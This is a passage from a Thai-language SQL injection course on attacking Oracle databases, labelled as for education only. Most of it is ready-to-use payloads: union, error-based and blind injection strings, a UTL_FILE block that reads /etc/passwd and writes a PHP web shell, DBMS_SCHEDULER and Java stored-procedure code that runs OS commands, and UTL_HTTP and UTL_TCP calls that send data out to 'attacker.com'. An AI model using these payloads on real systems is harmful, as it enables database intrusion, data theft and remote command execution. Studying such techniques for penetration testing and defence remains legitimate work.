# Part 022: Oracle Database SQL Injection Techniques

## ภาพรวม

Oracle Database มีสถาปัตยกรรมที่แตกต่างจาก MySQL/PostgreSQL อย่างมาก โดยเฉพาะ requirement ของ `FROM dual`, Data Dictionary views, และ packages ต่างๆ

**ขั้นตอนที่ 286-305**

---

## 286. Oracle Fundamentals

### 86.1 ความแตกต่างหลัก

```sql
-- Oracle ต้องมี FROM clause เสมอ
SELECT 1 FROM dual;      -- dual คือ dummy table
SELECT sysdate FROM dual;
SELECT user FROM dual;

-- String concatenation ใช้ ||
SELECT 'hello' || ' ' || 'world' FROM dual;

-- Limit rows ด้วย rownum (ไม่มี LIMIT)
SELECT * FROM users WHERE rownum <= 10;
SELECT * FROM (SELECT * FROM users WHERE rownum <= 20) WHERE rownum > 10;

-- ใน Oracle 12c+ สามารถใช้ FETCH FIRST
SELECT * FROM users FETCH FIRST 10 ROWS ONLY;
SELECT * FROM users OFFSET 5 ROWS FETCH NEXT 10 ROWS ONLY;

-- Comments
SELECT * FROM users --comment
SELECT * FROM users /* comment */

-- NULL concatenation
'a' || NULL || 'b'  -- = 'ab' ใน Oracle (ต่างจาก SQL standard)
```

### 86.2 Data Types

```sql
-- Oracle data types
VARCHAR2(n)   -- Variable length string (recommended over VARCHAR)
NVARCHAR2(n)  -- National character set
CHAR(n)       -- Fixed length string
NUMBER(p,s)   -- Numeric
DATE          -- Date and time
TIMESTAMP     -- Timestamp with precision
CLOB          -- Character Large Object
BLOB          -- Binary Large Object
```

---

## 287. Oracle Enumeration

### 87.1 System Information

```sql
-- Version
SELECT banner FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT version FROM v$instance;

-- Database
SELECT name FROM v$database;
SELECT ora_database_name FROM dual;
SELECT sys_context('USERENV','DB_NAME') FROM dual;

-- Current user
SELECT user FROM dual;
SELECT sys_context('USERENV','SESSION_USER') FROM dual;
SELECT sys_context('USERENV','CURRENT_USER') FROM dual;

-- Server
SELECT host_name FROM v$instance;
SELECT sys_context('USERENV','HOST') FROM dual;
SELECT sys_context('USERENV','IP_ADDRESS') FROM dual;
SELECT sys_context('USERENV','OS_USER') FROM dual;
SELECT sys_context('USERENV','TERMINAL') FROM dual;
```

### 87.2 Users

```sql
-- ดู users ทั้งหมด
SELECT username FROM all_users;
SELECT username, user_id, account_status FROM dba_users;

-- ดู current user roles
SELECT granted_role FROM user_role_privs;

-- ดู privileges
SELECT * FROM user_sys_privs;
SELECT * FROM user_tab_privs;
SELECT * FROM dba_sys_privs WHERE grantee = user;
```

### 87.3 Schemas และ Tables

```sql
-- ดู accessible schemas (เทียบกับ databases)
SELECT DISTINCT owner FROM all_tables ORDER BY owner;

-- ดู tables ของ current user
SELECT table_name FROM user_tables;

-- ดู tables ที่ accessible (ทุก owners)
SELECT owner, table_name FROM all_tables ORDER BY owner, table_name;

-- ดู tables ทั้งหมด (ต้องการ DBA)
SELECT owner, table_name FROM dba_tables;
```

### 87.4 Columns

```sql
-- ดู columns ใน table ของ current user
SELECT column_name, data_type, data_length 
FROM user_tab_columns 
WHERE table_name = 'USERS';

-- ดู columns ทุก accessible tables
SELECT owner, table_name, column_name, data_type 
FROM all_tab_columns 
WHERE table_name = 'USERS';
```

---

## 288. Oracle Union-Based

```sql
-- Oracle ต้องมี FROM dual ใน SELECT
' UNION SELECT NULL FROM dual--

-- หาจำนวน columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

-- ด้วย UNION SELECT NULL
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,NULL,NULL FROM dual--

-- ดึงข้อมูล
' UNION SELECT NULL,user FROM dual--
' UNION SELECT NULL,(SELECT banner FROM v$version WHERE rownum=1) FROM dual--

-- ดึง tables
' UNION SELECT NULL,table_name FROM user_tables WHERE rownum=1--

-- ดึง columns
' UNION SELECT NULL,column_name FROM user_tab_columns WHERE table_name='USERS' AND rownum=1--

-- ดึงข้อมูล (ต้องการ pagination แบบ Oracle)
' UNION SELECT NULL,username FROM users WHERE rownum=1--
' UNION SELECT NULL,username FROM users WHERE rownum=1 AND username NOT IN ('admin')--
```

---

## 289. Oracle Error-Based

```sql
-- UTL_INADDR.GET_HOST_NAME (ทำ DNS request + error)
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
-- Error: ORA-29257: host unknown to network...

-- UTL_HTTP (HTTP request)
' AND 1=utl_http.request((SELECT banner FROM v$version WHERE rownum=1))--

-- XMLType
' AND 1=xmltype('<?xml version="1.0" encoding="UTF-8"?>' || 
  (SELECT username FROM users WHERE rownum=1) || '</root>')--

-- CTXSYS.DRITHSX.SN
' AND 1=ctxsys.drithsx.sn(user,(SELECT banner FROM v$version WHERE rownum=1))--

-- DBMS_PIPE (ทำ time-based ด้วย)
' AND 1=dbms_pipe.receive_message((SELECT banner FROM v$version WHERE rownum=1),5)--
```

---

## 290. Oracle Blind Techniques

### 90.1 Boolean-Based

```sql
-- True condition
' AND (SELECT SUBSTR(user,1,1) FROM dual)='S'--

-- Length check
' AND (SELECT LENGTH(user) FROM dual)=3--

-- Number of tables
' AND (SELECT COUNT(*) FROM user_tables)>5--

-- Specific table exists
' AND (SELECT COUNT(*) FROM user_tables WHERE table_name='USERS')=1--
```

### 90.2 Time-Based

```sql
-- DBMS_PIPE (ต้องการ privileges)
' AND 1=dbms_pipe.receive_message('a',5)--

-- Conditional delay
' AND CASE WHEN (user='SYS') THEN dbms_pipe.receive_message('a',5) ELSE 1 END=1--

-- Heavy query (ไม่ต้องการ privileges พิเศษ)
' AND 1=(SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C WHERE A.object_type='TABLE')--
```

---

## 291. Oracle DBMS Packages

### 91.1 UTL_FILE (File Operations)

```sql
-- อ่านไฟล์ (ต้องการ EXECUTE privilege)
DECLARE
  f utl_file.file_type;
  s varchar2(32767);
BEGIN
  f := utl_file.fopen('/etc', 'passwd', 'R');
  utl_file.get_line(f, s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
END;
/

-- เขียนไฟล์
DECLARE
  f utl_file.file_type;
BEGIN
  f := utl_file.fopen('/tmp', 'test.txt', 'W');
  utl_file.put_line(f, '<?php system($_GET["cmd"]); ?>');
  utl_file.fclose(f);
END;
/
```

### 91.2 DBMS_SCHEDULER (OS Command Execution)

```sql
-- สร้าง job ที่รัน OS command
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'MY_JOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash -c "id > /tmp/out.txt"',
    enabled    => TRUE
  );
END;
/

-- รัน job ทันที
EXEC DBMS_SCHEDULER.RUN_JOB('MY_JOB');
```

### 91.3 UTL_HTTP (HTTP Requests)

```sql
-- ทำ HTTP GET request (OOB exfiltration)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT user FROM dual)) FROM dual;
```

### 91.4 UTL_TCP (TCP Connections)

```sql
-- สร้าง TCP connection
DECLARE
  c utl_tcp.connection;
  r integer;
BEGIN
  c := utl_tcp.open_connection('attacker.com', 4444);
  r := utl_tcp.write_text(c, 'Oracle '||(SELECT user FROM dual)||chr(13)||chr(10));
  utl_tcp.close_connection(c);
END;
/
```

---

## 292. Oracle Privilege Escalation

### 92.1 Java in Oracle

```sql
-- Oracle มี Java Virtual Machine built-in
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE JAVA SOURCE NAMED "OsCmd" AS ' ||
  'public class OsCmd {' ||
  '  public static String runCmd(String args) {' ||
  '    try {' ||
  '      String[] cmd = {"/bin/sh","-c",args};' ||
  '      Runtime rt = Runtime.getRuntime();' ||
  '      Process proc = rt.exec(cmd);' ||
  '      java.io.InputStream stdIn = proc.getInputStream();' ||
  '      java.util.Scanner s = new java.util.Scanner(stdIn).useDelimiter("\\A");' ||
  '      return s.hasNext() ? s.next() : "";' ||
  '    } catch (Exception e) { return e.getMessage(); }' ||
  '  }' ||
  '}';
END;
/

-- Compile
EXEC dbms_java.compile_class('OsCmd');

-- สร้าง stored function
CREATE OR REPLACE FUNCTION run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'OsCmd.runCmd(java.lang.String) return java.lang.String';
/

-- รัน command
SELECT run_cmd('id') FROM dual;
SELECT run_cmd('cat /etc/passwd') FROM dual;
```

---

## 293. Oracle Data Dictionary Views

```sql
-- User (current schema only)
user_tables        -- tables ของ current user
user_tab_columns   -- columns ของ tables ของ current user
user_views         -- views ของ current user
user_procedures    -- stored procedures ของ current user
user_sequences     -- sequences ของ current user
user_triggers      -- triggers ของ current user

-- All (accessible objects)
all_tables         -- tables ที่ access ได้
all_tab_columns    -- columns ที่ access ได้
all_users          -- users ทั้งหมด
all_objects        -- objects ทั้งหมดที่ access ได้

-- DBA (ทุก objects - ต้องการ DBA privilege)
dba_tables         -- ทุก tables
dba_users          -- ทุก users พร้อม password hash
dba_sys_privs      -- ทุก system privileges

-- V$ views (performance/system views)
v$version          -- database version
v$database         -- database info
v$instance         -- instance info
v$session          -- active sessions
v$sql              -- SQL statements ใน library cache
```

---

## 294. แบบฝึกหัด

### Exercise 1: Oracle Enumeration

```sql
SELECT banner FROM v$version;
SELECT name FROM v$database;
SELECT user FROM dual;
SELECT table_name FROM user_tables;
SELECT column_name FROM user_tab_columns WHERE table_name='USERS';
```

### Exercise 2: Oracle UNION

```sql
-- หาจำนวน columns
' ORDER BY 3--

-- UNION SELECT ต้องมี FROM dual
' UNION SELECT NULL,user,NULL FROM dual--

-- ดึง tables
' UNION SELECT NULL,table_name,NULL FROM user_tables WHERE rownum=1--
```

---

## สรุป

Oracle มีเทคนิค unique:

1. **FROM dual** - required สำหรับ SELECT ที่ไม่มี FROM
2. **Data Dictionary** - user_*, all_*, dba_* views
3. **DBMS packages** - UTL_FILE, UTL_HTTP, DBMS_SCHEDULER
4. **Java VM** - execute Java code ใน database
5. **rownum** - แทน LIMIT/OFFSET

---

*Part 022 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
